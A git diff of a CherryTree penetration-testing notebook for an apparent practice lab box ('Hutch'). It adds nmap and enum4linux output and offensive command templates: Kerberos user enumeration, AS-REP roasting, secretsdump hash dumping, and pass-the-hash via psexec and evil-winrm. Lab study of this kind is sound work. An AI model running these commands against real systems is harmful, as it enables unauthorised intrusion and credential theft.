@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="10.11.1." unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
-    <rich_text>IP :10.11.1.
+  <node name="192.168.162.122" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
+    <rich_text>IP :192.168.162.122
 Hostname:
 OS:
 
@@ -17,7 +17,147 @@ Windows Proof: </rich_text>
     <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1676120787"/>
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1687807163">
+      <rich_text>
+
+
+ Domain: hutch.offsec0.                                                                                                                                                         
+Domain Name: HUTCH                                                                                                                                                          
+Domain Sid: S-1-5-21-2216925765-458455009-2806096489
+SMB         192.168.162.122 445    </rich_text>
+      <rich_text weight="heavy">HUTCHDC</rich_text>
+      <rich_text>          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC)</rich_text>
+      <rich_text weight="heavy"> (domain:hutch.offsec</rich_text>
+      <rich_text>) (signing:True) (SMBv1:False)</rich_text>
+      <node name="NMAP" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687806060" ts_lastsave="1687806087">
+        <rich_text>
+
+Domain: hutch.offsec0.</rich_text>
+        <codebox char_offset="0" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">./nmapScanTCP.sh 192.168.162.122 PGPractice/Hutch/nmap/nmapALLTCP.log
+USAGE: ./nmapScanTCP.sh &lt;inputip&gt; &lt;outputfile&gt;
+
+the ports found are: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49671,49672,49674,49687
+PGPractice/Hutch/nmap/nmapALLTCP.log
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 14:57 EDT
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 14:57
+Completed NSE at 14:57, 0.00s elapsed
+Initiating NSE at 14:57
+Completed NSE at 14:57, 0.00s elapsed
+Initiating NSE at 14:57
+Completed NSE at 14:57, 0.00s elapsed
+Initiating Ping Scan at 14:57
+Scanning 192.168.162.122 [2 ports]
+Completed Ping Scan at 14:57, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:57
+Completed Parallel DNS resolution of 1 host. at 14:57, 0.00s elapsed
+Initiating Connect Scan at 14:57
+Scanning 192.168.162.122 (192.168.162.122) [20 ports]
+Discovered open port 445/tcp on 192.168.162.122
+Discovered open port 53/tcp on 192.168.162.122
+Discovered open port 135/tcp on 192.168.162.122
+Discovered open port 80/tcp on 192.168.162.122
+Discovered open port 139/tcp on 192.168.162.122
+Discovered open port 49666/tcp on 192.168.162.122
+Discovered open port 49672/tcp on 192.168.162.122
+Discovered open port 636/tcp on 192.168.162.122
+Discovered open port 88/tcp on 192.168.162.122
+Discovered open port 5985/tcp on 192.168.162.122
+Discovered open port 3269/tcp on 192.168.162.122
+Discovered open port 3268/tcp on 192.168.162.122
+Discovered open port 49687/tcp on 192.168.162.122
+Discovered open port 49674/tcp on 192.168.162.122
+Discovered open port 49671/tcp on 192.168.162.122
+Discovered open port 593/tcp on 192.168.162.122
+Discovered open port 9389/tcp on 192.168.162.122
+Discovered open port 464/tcp on 192.168.162.122
+Discovered open port 389/tcp on 192.168.162.122
+Discovered open port 49667/tcp on 192.168.162.122
+Completed Connect Scan at 14:57, 0.07s elapsed (20 total ports)
+Initiating Service scan at 14:57
+Scanning 20 services on 192.168.162.122 (192.168.162.122)
+Completed Service scan at 14:58, 55.18s elapsed (20 services on 1 host)
+NSE: Script scanning 192.168.162.122.
+Initiating NSE at 14:58
+Completed NSE at 14:58, 40.61s elapsed
+Initiating NSE at 14:58
+Completed NSE at 14:58, 1.07s elapsed
+Initiating NSE at 14:58
+Completed NSE at 14:58, 0.00s elapsed
+Nmap scan report for 192.168.162.122 (192.168.162.122)
+Host is up (0.035s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-webdav-scan: 
+|   Server Date: Mon, 26 Jun 2023 18:58:09 GMT
+|   Server Type: Microsoft-IIS/10.0
+|   WebDAV type: Unknown
+|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
+|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
+|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-26 18:57:20Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49672/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49687/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-06-26T18:58:12
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+Initiating NSE at 14:58
+Completed NSE at 14:58, 0.00s elapsed
+Initiating NSE at 14:58
+Completed NSE at 14:58, 0.00s elapsed
+Initiating NSE at 14:58
+Completed NSE at 14:58, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.72 seconds
+                                                               
+                                                               </codebox>
+      </node>
+      <node name="Recon" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687806453" ts_lastsave="1687806487">
+        <rich_text>Enum4linux
+
+</rich_text>
+        <codebox char_offset="12" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  ===============================( Getting domain SID for 192.168.162.122 )===============================
+                                                                                                                                                                            
+Domain Name: HUTCH                                                                                                                                                          
+Domain Sid: S-1-5-21-2216925765-458455009-2806096489
+
+[+] Host is part of a domain (not a workgroup)         
+</codebox>
+      </node>
+    </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
       <rich_text weight="heavy">Service Exploited:  
 Vulnerability Type:
@@ -1187,9 +1327,9 @@ echo ts.Close </rich_text>
 Set the </rich_text>
         <rich_text family="monospace">--insecuressl</rich_text>
         <rich_text> flag.</rich_text>
-        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
-        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
-        <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.162.122 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.162.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.162.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
       </node>
       <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
         <rich_text scale="h2">SSH</rich_text>
@@ -1231,26 +1371,26 @@ run the following in case
         <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
         <rich_text> -o </rich_text>
         <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
-        <rich_text> -i temp root@10.11.1.  -p 22
+        <rich_text> -i temp root@192.168.162.122  -p 22
 
 
 _____________________________________
 
 </rich_text>
-        <rich_text scale="h2">Port-Forwarding:</rich_text>
+        <rich_text scale="h2">Port-Forward</rich_text>
+        <rich_text justification="left" scale="h2"></rich_text>
+        <rich_text scale="h2">ing:</rich_text>
         <rich_text>
 
 
-</rich_text>
-        <rich_text justification="left"></rich_text>
-        <rich_text>  </rich_text>
-        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@10.11.1. -p 22</codebox>
+  </rich_text>
+        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.162.122 -p 22</codebox>
         <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
         <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
         <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
-        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@10.11.1.</codebox>
+        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@192.168.162.122</codebox>
       </node>
-      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687805895">
+      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687617725">
         <rich_text scale="h2">Usage
 </rich_text>
         <rich_text>
@@ -1265,8 +1405,8 @@ _____________________________________
 
 </rich_text>
         <rich_text justification="left"></rich_text>
-        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. | tee output.log</codebox>
-        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -port [port number 1], [port number 2], [port number 3]</codebox>
+        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 192.168.162.122 -output niktooutput.log</codebox>
+        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 192.168.162.122 -port [port number 1], [port number 2], [port number 3]</codebox>
       </node>
       <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1687690153">
         <rich_text scale="h1">Nmap</rich_text>
@@ -1329,15 +1469,15 @@ Also check
         <rich_text link="node 41">CrackMapExec</rich_text>
         <rich_text>
 </rich_text>
-        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.11.1.</codebox>
-        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.11.1.</codebox>
-        <codebox char_offset="104" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1.</codebox>
-        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1. -u &lt;user&gt; -p &lt;pass&gt;</codebox>
-        <codebox char_offset="178" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.11.1.</codebox>
-        <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
-        <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
+        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 192.168.162.122</codebox>
+        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 192.168.162.122</codebox>
+        <codebox char_offset="104" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 192.168.162.122</codebox>
+        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 192.168.162.122 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
+        <codebox char_offset="178" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 192.168.162.122</codebox>
+        <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 192.168.162.122</codebox>
+        <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 192.168.162.122</codebox>
       </node>
-      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1687808714">
+      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1687690428">
         <rich_text>
 
 
@@ -1358,82 +1498,6 @@ Also check
         <rich_text>
 </rich_text>
         <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
-        <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687814576">
-          <rich_text scale="h1">Kerberos Authentication:</rich_text>
-          <rich_text>
-</rich_text>
-          <rich_text justification="left"></rich_text>
-          <rich_text>
-
-____________________________________________________________________________________
-
-</rich_text>
-          <rich_text justification="left"></rich_text>
-          <codebox char_offset="25" justification="left" frame_width="1970" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
-# make sure u add the domain to the ip in host file
-kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 
-
-or
-_______________________________________________________________________
-
-## once u have list of users from ldap search or somewhere else
-
-./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 10.11.1. usernames.txt
-
-
-____________________________________________________________________________________
-
-nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" 10.11.1.
-Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='&lt;domain&gt;',userdb=/root/Desktop/usernames.txt 10.11.1.
-
-____________________________________________________________________________________
-
-
-msf&gt; use auxiliary/gather/kerberos_enumusers
-
-____________________________________________________________________________________
-
-
-crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
-          <codebox char_offset="114" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0"></codebox>
-          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687808763">
-            <rich_text scale="h1">Request AS_REP message</rich_text>
-            <rich_text>
-
-</rich_text>
-            <rich_text scale="h3">Using Impacket</rich_text>
-            <rich_text>
-
-
-</rich_text>
-            <rich_text justification="left"></rich_text>
-            <rich_text>
-
-or
-
-</rich_text>
-            <rich_text justification="left"></rich_text>
-            <rich_text>
-
-</rich_text>
-            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
-python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-#Use domain creds to extract targets and target them
-python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
-
-or
-
-impacket-GetNPUsers spookysec.local/svc-admin -no-pass
-
-
-or
-
-python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.11.1.
-</codebox>
-            <codebox char_offset="48" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
-Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
-          </node>
-        </node>
         <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1687690728">
           <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690744">
             <rich_text scale="h1">Request AS_REP message</rich_text>
@@ -1461,7 +1525,7 @@ impacket-GetNPUsers spookysec.local/svc-admin -no-pass
 
 or
 
-python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.11.1.
+python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 192.168.162.122
 </codebox>
           </node>
           <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690752">
@@ -1478,7 +1542,7 @@ python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pas
 </rich_text>
             <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
 or 
-impacket-secretsdump domain.local/user@10.11.1.</codebox>
+impacket-secretsdump domain.local/user@192.168.162.122</codebox>
           </node>
           <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
             <rich_text>Exploitation via pass the hash
@@ -1506,10 +1570,10 @@ or
 
 
 </rich_text>
-            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH
+            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@192.168.162.122 -hashes randomLMHASH:oeasdNTLMHASH
 </codebox>
-            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@10.11.1. </codebox>
-            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@10.11.1.</codebox>
+            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@192.168.162.122 </codebox>
+            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@192.168.162.122</codebox>
           </node>
           <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
             <rich_text>
@@ -1534,7 +1598,7 @@ or
             <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
 or
 impacket-GetADUsers domain/user:password@IP</codebox>
-            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.11.1.</codebox>
+            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 192.168.162.122</codebox>
           </node>
           <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
             <rich_text>
@@ -1544,7 +1608,7 @@ impacket-GetADUsers domain/user:password@IP</codebox>
 
 </rich_text>
             <rich_text justification="left"></rich_text>
-            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user</codebox>
+            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 192.168.162.122 domain.local/user</codebox>
           </node>
         </node>
         <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1687690728">
@@ -1562,8 +1626,8 @@ or
           <rich_text>
 
 </rich_text>
-          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
-          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH</codebox>
+          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 192.168.162.122 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
+          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@192.168.162.122 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
           <codebox char_offset="11" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
         </node>
         <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1687690347">
@@ -1708,24 +1772,24 @@ runas /netonly /user:domain.local\user cmd
  
 </rich_text>
           <rich_text justification="left"></rich_text>
-          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1.</codebox>
-          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u &lt;username&gt; -p &lt;password&gt; --shares
+          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.122</codebox>
+          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.122 -u &lt;username&gt; -p &lt;password&gt; --shares
 
 Ex:
 
-crackmapexec smb 10.11.1. -u admin -p abcd1234 --shares</codebox>
-          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u admin -H reallybighashvalue</codebox>
